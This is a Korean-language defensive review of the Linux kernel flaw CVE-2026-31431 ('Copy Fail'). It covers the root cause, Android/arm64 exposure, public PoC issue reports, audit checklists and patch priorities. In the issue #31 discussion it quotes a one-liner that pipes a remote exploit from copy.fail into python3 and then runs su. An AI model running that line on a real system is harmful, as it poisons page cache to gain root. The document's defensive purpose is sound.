Copy Fail / CVE-2026-31431
Linux and Android Exposure Review

Linux 서버, 컨테이너/CI 인프라, RHEL 계열 엔터프라이즈 시스템, Android ARM/arm64 커널까지 포함해 Copy Fail의 kernel primitive, exploitability 조건, 패치 우선순위, 운영 점검 항목을 정리한 문서.

Executive Summary

엔터프라이즈 Linux에서는 우선 패치 대상으로 봐야 한다. CVE-2026-31431은 local unprivileged user 또는 untrusted workload가 kernel crypto userspace API와 page cache 경로를 악용해 권한 상승으로 이어질 수 있는 유형이다. 특히 container host, Kubernetes/OpenShift node, self-hosted CI runner, shared shell/build host는 우선순위가 높다.

ARM/arm64 Android 커널도 해당 취약 코드와 syscall surface가 열려 있으면 page-cache write primitive 자체는 잠재적으로 성립한다고 봐야 한다. 이 문제는 x86 전용 버그가 아니라 Linux 공통 crypto/algif_aead, AF_ALG, splice(), pipe/page-cache/scatterlist 상호작용의 문제다.

반면 공개 PoC가 보여주는 “/usr/bin/su page cache 변조 후 setuid root shell 획득” 경로는 stock Android에서 그대로 성립할 가능성이 낮다. Android는 오래전부터 setuid/setgid 프로그램 제거, nosuid, SELinux, app seccomp, verified/read-only system partition을 조합해 일반 Linux 배포판과 다른 공격 표면을 가진다.

공개 GitHub issue #31의 “Ubuntu 25.10 arm64에서 동작하지 않음” 사례는 현재 공개 Python PoC의 embedded payload가 x86-64 ELF인 영향으로 해석하는 것이 더 타당하다. 스크린샷의 실패 메시지는 /usr/bin/su 실행 시 Exec format error이며, PoC 내부 압축 payload의 ELF e_machine 값은 0x3e 즉 x86-64다. 이는 “arm64 커널 primitive 부재”의 직접 증거가 아니라 “공개 PoC payload가 arm64 실행 파일이 아님”을 보여주는 신호다.

따라서 전체 판단 기준은 “공개 PoC가 현재 시스템에서 root shell을 주는가”가 아니다. 패치 여부, AF_ALG/algif_aead reachability, target surface, workload 신뢰 수준, 재부팅 완료 여부를 분리해서 봐야 한다.

공통 평가 프레임

1. Patch State

vendor가 CVE-2026-31431 fix를 제공했는지, 해당 kernel package가 설치됐는지, 그리고 실제 running kernel이 patched version인지 확인한다.

2. Reachability

CONFIG_CRYPTO_USER_API_AEAD, AF_ALG socket, authencesn, splice() 경로가 local context에서 도달 가능한지 확인한다.

3. Impact Surface

setuid binary, file capability, root-owned executable, privileged helper, shared page cache, container/CI workload가 있는지 확인한다.

운영 환경에서는 공개 exploit을 실행하지 않는다. PoC는 page cache 상태를 변조할 수 있으며, 검증이 필요하면 비파괴 reachability check와 vendor patch 확인을 먼저 수행한다.

Root Cause Model

Copy Fail의 본질은 setuid 바이너리가 아니라 page cache page가 커널 crypto API의 쓰기 대상 scatterlist로 들어가는 상태를 만들 수 있다는 점이다. 공개 PoC는 이 primitive를 setuid 바이너리 변조에 사용했을 뿐이다.

  1. splice()가 파일 내용을 사용자 공간 복사 없이 pipe buffer로 이동시킨다.
  2. pipe buffer는 파일의 page cache page를 참조할 수 있다.
  3. AF_ALG AEAD socket이 sendmsg()와 ancillary data를 통해 crypto request를 구성한다.
  4. 취약한 algif_aead in-place 처리 경로에서 source/destination scatterlist 경계가 잘못 형성된다.
  5. 그 결과 읽기 전용이어야 할 page cache page가 crypto operation의 destination처럼 취급될 수 있다.

이 흐름은 ARM 명령어 세트나 Android userspace ABI가 아니라 kernel common path의 객체 관계 문제다. 즉 “ARM 커널이라서 안전하다”는 판단은 성립하지 않는다.

Android / ARM 평가 프레임

1. Kernel Code Presence

Android common kernel 또는 vendor kernel에 취약한 algif_aead 구현이 포함되어 있고, fix commit 또는 동등 패치가 없으면 코드 레벨에서는 영향 가능성이 있다.

확인 대상: kernel version, android common branch, vendor backport, crypto/algif_aead.c 패치 여부.

2. Reachability

일반 앱, shell, isolated process, vendor service 등에서 AF_ALG AEAD socket과 splice(), sendmsg() 조합이 실제 호출 가능한지 확인해야 한다.

확인 대상: seccomp policy, SELinux socket class permission, kernel config, module load policy.

3. Impact Chain

page-cache write primitive가 root escalation, privileged code execution, policy bypass, persistent state 변조로 이어지는 Android-specific target이 있는지 따져야 한다.

확인 대상: setuid/setgid, file capability, privileged helper, vendor daemon copy/exec flow.

ARM64 PoC Failure Caveat

Issue #31의 스크린샷은 curl https://copy.fail/exp | python3 && su 실행 후 sh: 1: su: Exec format error와 bash: /usr/bin/su: cannot execute binary file: Exec format error가 발생한 상황을 보여준다. 해당 시스템은 uname -a 기준 aarch64다.

공개 Python PoC는 page cache에 쓸 payload를 zlib-compressed hex blob으로 포함한다. 이 blob을 해제하면 ELF header가 나오고, ELF machine field는 0x3e이다. Linux ELF에서 0x3e는 x86-64를 의미한다. 따라서 arm64 시스템에서 이 payload가 /usr/bin/su page cache에 반영된 뒤 실행되면 커널은 arm64 executable로 인식하지 못하고 Exec format error를 낼 수 있다.

이 관찰은 “공개 PoC가 arm64용으로 작성되지 않았다”는 강한 증거지만, “취약한 algif_aead 경로가 arm64에서 안전하다”는 증거는 아니다. arm64 영향 여부를 판단하려면 payload 실행 성공이 아니라 page-cache mutation 자체가 발생했는지, 그리고 upstream fix가 해당 Android/vendor kernel에 적용되었는지를 확인해야 한다.

GitHub Issues에서 얻은 보강 신호

공개 이슈들은 “취약점이 모든 환경에서 같은 방식으로 root shell을 준다”는 주장보다, PoC 성공이 kernel config, AF_ALG 노출, target 파일, payload architecture, patch level에 민감하다는 점을 더 잘 보여준다. Android/ARM 검토에는 아래 신호가 특히 중요하다.

이슈/PR 관찰 Android/ARM 판단에 주는 의미
#31 Ubuntu arm64 실패 aarch64 시스템에서 Exec format error 발생. 공개 PoC의 embedded payload가 x86-64라서 실행 단계가 실패한 것으로 해석된다. arm64 kernel primitive 부재의 증거는 아니다.
PR #25 aarch64 호환 payload aarch64용 별도 PoC 파일을 추가하는 PR이 열려 있다. 해당 payload의 ELF machine 값은 183, 즉 AArch64다. #31 실패가 architecture-specific payload 문제였다는 해석을 보강한다. 다만 PR 존재 자체가 Android stock exploitability를 증명하지는 않는다.
#10 Android kernel 기반 Debian 실패 6.12.63-android16 aarch64 kernel에서 Address family not supported by protocol 발생. 해당 환경은 AF_ALG 또는 필요한 user API가 노출되지 않아 PoC reachability가 막힌 사례로 보인다.
#18 Android/Termux 실패 Termux에서 /usr/bin/su가 없고, Android에는 일반 앱에 노출된 SUID 바이너리가 없다는 댓글이 달렸다. stock Android에서 공개 PoC식 setuid target이 부재하다는 기존 판단을 보강한다.
#29 safe verification 제안 PoC가 page cache poisoning을 일으키므로 비파괴적인 AF_ALG reachability check가 필요하다는 제안. Android 평가에서도 exploit 실행보다 kernel config와 syscall reachability를 먼저 확인해야 한다.
#28 cache 오염 지속 PoC 실행 후 module unload만으로는 변조된 page cache 상태가 사라지지 않으며 reboot 또는 cache invalidation이 필요하다는 논의. 검증 스크립트는 production 기기에서 실행하면 안 된다. Android에서도 소유한 테스트 빌드에서만 비파괴 확인을 우선한다.
#30 built-in module mitigation 실패 RHEL에서 algif_aead가 built-in이면 rmmod/modprobe -r와 modprobe.d 차단이 통하지 않는다. Android GKI/vendor kernel에서 built-in이면 module blacklist 방식은 완화책이 아니다. kernel patch 또는 syscall policy 차단이 필요하다.
#23 read permission 완화 논의 SUID 파일의 world-readable 권한 제거가 충분한 완화가 아니라는 반론이 제기됐다. page-cache write primitive의 target은 executable에 한정된다고 보면 안 된다. Android에서는 privileged text/config/state 파일까지 영향 모델을 넓혀야 한다.
#3 Gentoo-musl 실패 Address family not supported by protocol로 실패. AF_ALG user API 부재 또는 비활성화는 실질적인 reachability 차단 조건이다.
#4 Alpine 실패 후 조건 변경 시 성공 댓글 기본 환경에서는 target 접근 문제로 실패했지만, login/shell 구성 변경 시 동작했다는 댓글이 있다. “동일 커널이라도 userspace target과 파일 권한이 exploitability를 좌우한다”는 점을 보여준다.

이슈 기반 결론은 보수적으로 잡아야 한다. 실패 사례는 대부분 “패치됨”, “AF_ALG 미노출”, “target 파일 없음/권한 없음”, “payload architecture 불일치” 중 하나로 설명된다. 이는 Android에서 공개 PoC 성공 가능성을 낮추지만, 취약한 kernel code path 자체가 ARM/Android에서 불가능하다는 증거는 아니다.

Feasibility Matrix

조건 Stock Android 예상 OEM/Userdebug/Rooted 환경 판단 의미
취약 algif_aead 코드 존재 가능 가능 Android도 Linux kernel 기반이므로 vendor/common branch 상태에 의존한다.
CONFIG_CRYPTO_USER_API_AEAD 활성 기기별 기기별 AF_ALG AEAD userspace entry가 없으면 PoC 경로는 막힌다.
앱 도메인에서 AF_ALG socket 생성 가능 정책 의존 완화 약화 가능 seccomp/SELinux가 호출을 차단하면 untrusted app reachability가 낮아진다.
setuid root 바이너리 존재 낮음 가능 공개 PoC식 root shell 경로의 핵심 전제다.
공격자 제어 바이너리가 root-owned privileged target으로 복사 낮음 OEM 버그 의존 copy/install/update helper의 owner/mode/capability 처리 버그가 필요하다.
file capability 기반 privilege target 검토 필요 검토 필요 setuid가 없어도 capability-bearing executable이 있으면 대체 타깃이 될 수 있다.
SELinux domain transition 우회 가능 낮음 정책 품질 의존 Android에서는 uid 0만으로 충분하지 않고 SELinux domain이 중요하다.

“임의 바이너리 유입 후 su 권한 경로로 복사” 시나리오

질문의 핵심은 공개 PoC처럼 기존 su를 건드리는 것이 아니라, 공격자 제어 파일이 어떤 과정을 통해 privileged executable로 승격될 수 있느냐이다. stock Android에서는 이 확률이 낮지만, vendor/OEM 커스텀에서는 감사할 가치가 있다.

성립에 필요한 조건

단계 필요 조건 Android에서의 장벽
파일 유입 공격자가 APK data, external storage, download cache, vendor import path 등에 파일을 둔다. 파일 owner는 보통 app uid이며, execute/mount/SELinux 제한이 붙는다.
root copy root/system/vendor daemon이 공격자 제어 파일을 root-owned path로 복사한다. 정상 AOSP 흐름은 package install, ota, staged update에서 signature/label 검증을 한다.
privilege metadata 부여 복사 결과에 setuid/setgid 또는 강한 file capability가 붙는다. AOSP는 setuid/setgid 프로그램을 제거했고, writable mount는 대체로 nosuid다.
실행 가능성 공격자 context에서 해당 파일을 execute할 수 있고 mount가 nosuid가 아니다. SELinux execute permission, domain transition, verified partition, noexec/nosuid가 막는다.
page-cache 변조 대상 파일이 page cache에 올라가고 Copy Fail primitive로 쓰기 대상이 된다. 커널 primitive가 reachable해야 하며, 대상 파일 접근 권한도 필요하다.

즉 “임의 바이너리를 넣을 수 있다”는 것만으로는 부족하다. root-owned executable로 복사되고, privilege metadata가 유지 또는 부여되고, 공격자 context에서 실행 가능해야 한다. 이 조건 조합은 stock Android에서 낮지만, OEM helper나 factory 기능이 있는 빌드에서는 놓치기 쉬운 지점이다.

High-Value Audit Surface

Setuid / Setgid 잔존

AOSP 기준으로는 없어야 한다. 존재한다면 Copy Fail impact가 급격히 커진다. 특히 /system/xbin/su, vendor test binary, factory binary, legacy maintenance helper를 확인한다.

File Capabilities

setuid가 없어도 cap_sys_admin, cap_net_admin, cap_dac_override, cap_setuid 같은 capability가 붙은 실행 파일은 대체 타깃이 될 수 있다.

Root Copy / Install Helpers

vendor daemon이 external path, app-writable path, debug path에서 파일을 가져와 root-owned 위치로 복사하는지 본다. mode, owner, xattr, SELinux label을 어떻게 설정하는지가 핵심이다.

Privileged Re-exec Flow

root/system 프로세스가 디스크의 executable을 다시 읽어 실행하는 경로는 page cache 변조의 impact target이 된다. 특히 update agent, diagnostics, logging, modem/vendor maintenance 도구를 본다.

SELinux Weakening

permissive, broad execute_no_trans, app domain의 과도한 file/socket permission은 Android의 기본 장벽을 약화한다.

Seccomp Gaps

앱 또는 sandboxed workload에서 socket(AF_ALG), splice, sendmsg가 모두 열려 있으면 kernel primitive reachability가 높아진다.

Defensive Verification Checklist

아래 항목은 소유하거나 평가 권한이 있는 기기/빌드에서 방어 목적으로 확인한다. exploit payload 작성이나 privileged binary 변조 없이 표면을 점검하는 수준이다.

1. Kernel config / crypto surface

# Running device에서 가능한 경우
zcat /proc/config.gz 2>/dev/null | egrep 'CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_AUTHENC|CONFIG_CRYPTO_CBC|CONFIG_CRYPTO_HMAC|CONFIG_CRYPTO_SHA256|CONFIG_CRYPTO_AES'

# /proc/crypto가 노출되는 경우
cat /proc/crypto 2>/dev/null | egrep '(^name|^type|authencesn|authenc|cbc\\(aes\\)|hmac\\(sha256\\))'

2. Patch state

# kernel source tree가 있을 때
git log --oneline -- crypto/algif_aead.c | head -30
git grep -n "operating out-of-place\\|a664bf3d603d\\|72548b093ee3" -- crypto/

3. Privileged executable inventory

# setuid/setgid 잔존 여부
find /system /vendor /product /odm /system_ext /data -xdev \\( -perm -4000 -o -perm -2000 \\) -ls 2>/dev/null

# file capability inventory
getcap -r /system /vendor /product /odm /system_ext /data 2>/dev/null

4. Mount hardening

mount | egrep ' /data | /system | /vendor | /product | /odm | /system_ext '
cat /proc/mounts | egrep ' /data | /system | /vendor | /product | /odm | /system_ext '

5. SELinux / seccomp posture

getenforce 2>/dev/null
ps -AZ | head -40

# 특정 프로세스의 seccomp 상태 예시
pidof com.example.app 2>/dev/null | xargs -I{} sh -c 'echo PID={}; grep -E "Seccomp|NoNewPrivs" /proc/{}/status'

Decision Tree

Patch Required
취약 algif_aead 코드가 있고 AF_ALG AEAD가 reachable하다면, 공개 PoC가 stock Android에서 바로 root를 주지 않더라도 커널 패치 대상으로 분류한다. kernel primitive는 Android-specific target과 결합될 수 있다.
Exploitability Review
AF_ALG가 열려 있지만 setuid 타깃이 없는 경우, file capability, privileged helper, root copy/install flow, vendor debug path를 별도 조사한다.
Lower Immediate Impact
AF_ALG AEAD가 비활성화되어 있거나 seccomp/SELinux로 untrusted app에서 도달 불가하고, privileged executable surface도 없으면 즉시 root exploit 가능성은 낮다. 그래도 upstream/vendor fix 추적은 유지한다.

Android-Specific Risk Estimate

환경 Primitive 가능성 공개 PoC식 root 가능성 종합 판단
Stock production Android 기기/정책 의존 낮음 커널 패치 필요성은 남지만, setuid 기반 즉시 root는 낮게 본다.
OEM production with weak vendor helpers 가능 체인 의존 root copy, capability, privileged re-exec flow가 있으면 위험도가 올라간다.
Userdebug / eng build 가능 상대적으로 증가 debug feature, permissive 정책, su 잔존 여부에 따라 exploitability가 크게 변한다.
Rooted / custom ROM 가능 환경에 따라 높음 Magisk/su/custom mount 정책 때문에 일반 Android 가정이 깨질 수 있다.
Android container / Linux userspace on Android 가능 구성 의존 proot/chroot/container가 실제 kernel syscall과 mount policy를 어떻게 노출하는지 확인해야 한다.

Recommended Patch Position

Android 커널 패치 검토에서는 다음 입장을 권장한다.

  • ARM/arm64 여부와 무관하게 취약 algif_aead 코드가 있으면 영향 후보로 포함한다.
  • 공개 PoC가 stock Android에서 바로 root를 얻지 못한다는 이유만으로 “not affected” 처리하지 않는다.
  • AF_ALG AEAD가 앱/shell/vendor context에서 도달 가능하면 패치 우선순위를 높인다.
  • Android kernel에서 CONFIG_CRYPTO_USER_API_AEAD=n이거나 앱/shell context에서 socket(AF_ALG)가 EAFNOSUPPORT로 막히면 공개 PoC 경로의 reachability는 낮다.
  • algif_aead가 built-in이면 modprobe.d나 rmmod 기반 완화는 적용되지 않는다.
  • setuid 부재는 exploit impact를 낮추는 요소이지 kernel primitive 부재의 증거가 아니다.
  • OEM/vendor tree는 setuid보다 file capability, root copy helper, privileged re-exec flow를 더 집중적으로 본다.

최종 표현 예시: “Android stock exploitability is reduced by absence of user-accessible setuid targets and platform sandboxing; however ARM/arm64 Android kernels containing the affected algif_aead implementation may still expose the underlying page-cache write primitive if AF_ALG AEAD is reachable. Apply upstream or equivalent vendor fix.”

Enterprise Linux 점검 방향

회사 엔터프라이즈 시스템에서는 “PoC가 실행되는가”보다 “패치 상태, AF_ALG 노출, 취약한 workload 위치, 공유 커널 환경 여부”를 우선 확인해야 한다. 특히 RHEL 계열은 algif_aead가 module이 아니라 kernel에 built-in일 수 있어 lsmod나 rmmod만으로 판단하면 안 된다.

Red Hat Security Data API 기준, 2026-04-30 확인 시점에 CVE-2026-31431은 Red Hat severity Important, CVSS 3.1 7.8이며, RHEL 8/9/10 kernel은 Affected로 표시된다. RHEL 8/9의 kernel-rt도 Affected다.

IT팀 전달용 점검 체크리스트

아래 체크리스트는 운영팀이 자산 관리, 취약점 관리, 패치 실행, 예외 승인에 바로 사용할 수 있는 형태다.

1. 대상 자산 식별

  • Linux 서버 전체에서 OS, kernel package, running kernel, architecture, virtualization/container role을 수집한다.
  • RHEL 8/9/10, Rocky/Alma/Oracle Linux, Ubuntu/Debian/SUSE, Kubernetes/OpenShift node, self-hosted CI runner를 우선군으로 둔다.
  • 인터넷 노출 여부보다 “local user 또는 untrusted workload 실행 여부”를 우선 위험 기준으로 둔다.
hostnamectl
cat /etc/os-release
uname -a
rpm -q kernel kernel-core kernel-rt 2>/dev/null || true
dpkg -l 'linux-image*' 2>/dev/null | grep '^ii' || true

2. RHEL 계열 패치 상태 확인

# CVE가 현재 시스템에 적용 가능한지 확인
sudo dnf updateinfo list --cve CVE-2026-31431 2>/dev/null || sudo yum updateinfo list --cve CVE-2026-31431

# 보안 업데이트 상세
sudo dnf updateinfo info --cve CVE-2026-31431 2>/dev/null || sudo yum updateinfo info --cve CVE-2026-31431

# 사용 가능한 kernel 업데이트 확인
sudo dnf check-update kernel kernel-core kernel-rt 2>/dev/null || true

패키지를 설치한 뒤에도 uname -r이 여전히 이전 kernel이면 취약 kernel로 계속 실행 중이다. kernel 패치는 대부분 재부팅이 완료되어야 적용된다.

3. Kernel crypto surface 확인

# config 확인. 배포판별 경로가 다를 수 있다.
grep -E 'CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENC' /boot/config-$(uname -r) 2>/dev/null
zcat /proc/config.gz 2>/dev/null | grep -E 'CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENC'

# algif/aead가 module인지 built-in인지 확인
lsmod | grep -E 'algif|aead|authenc' || true
modinfo algif_aead 2>/dev/null || true

# /proc/crypto 노출 시 알고리즘 존재 확인
grep -A4 -E 'authencesn|authenc|cbc\\(aes\\)|hmac\\(sha256\\)' /proc/crypto 2>/dev/null

lsmod에 algif_aead가 없다고 안전하다는 뜻은 아니다. built-in이면 module list에 나오지 않고 rmmod도 통하지 않는다.

4. 비파괴 reachability 확인

운영 production에서 공개 exploit을 실행하지 않는다. 필요 시 소유한 테스트 시스템에서 AF_ALG socket 생성 가능 여부만 확인한다. 

python3 - <<'PY'
import socket
try:
    s = socket.socket(38, 5, 0)
    s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    print("AF_ALG AEAD reachable: investigate patch state immediately")
except OSError as e:
    print(f"AF_ALG AEAD not reachable from this context: {e}")
PY

이 확인은 “도달 가능성”만 본다. 패치 완료 여부의 대체 증거가 아니며, seccomp/SELinux context에 따라 결과가 달라질 수 있다.

5. 고위험 업무군 우선순위

우선순위 시스템 유형 조치
P0 Kubernetes/OpenShift node, container host, self-hosted CI runner, shared shell host 즉시 패치 또는 untrusted workload 중지/격리. 재부팅 창 확보.
P1 개발 서버, bastion, jump host, batch worker, build server 24-72시간 내 패치. local user 접근권과 실행 가능한 workload 검토.
P2 단일 tenant production app server 정기 긴급 패치 창에 포함. 웹 RCE 등과 chain 가능성을 고려.
P3 격리된 appliance, local user 없음, AF_ALG 차단 확인 벤더 패치 추적. 예외 승인 시 근거와 만료일 기록.

6. 완화책과 한계

  • 최선 조치는 vendor kernel patch 적용 후 patched kernel로 재부팅하는 것이다.
  • algif_aead가 loadable module이면 임시로 module loading을 차단할 수 있지만, built-in이면 효과가 없다.
  • 컨테이너/CI 환경에서는 patch 여부와 별개로 seccomp로 AF_ALG socket 생성을 차단하는 정책을 검토한다.
  • 공개 PoC 실행 후에는 page cache 상태가 남을 수 있으므로 production 검증에 사용하지 않는다.
  • 파일 무결성 검사만으로는 page cache 변조를 탐지하기 어렵다. 디스크 내용이 아니라 메모리 cache가 바뀌는 모델이다.

[Action Required] Linux kernel CVE-2026-31431 / Copy Fail 점검 및 패치

대상:
- RHEL 8/9/10 및 호환 배포판
- Ubuntu/Debian/SUSE/Arch 등 Linux 서버
- Kubernetes/OpenShift node, container host, self-hosted CI runner, shared login/build server

위험:
- local unprivileged user 또는 untrusted workload가 kernel AF_ALG/algif_aead 경로를 통해 page cache write primitive를 유발할 수 있음

필수 조치:
1. 각 서버의 OS, running kernel, installed kernel package를 수집
2. vendor advisory에서 CVE-2026-31431 fix package 확인
3. kernel update 적용 후 재부팅하여 uname -r 기준 patched kernel 실행 확인
4. container/CI/shared host는 우선 패치 또는 untrusted workload 임시 격리
5. production에서 공개 PoC 실행 금지
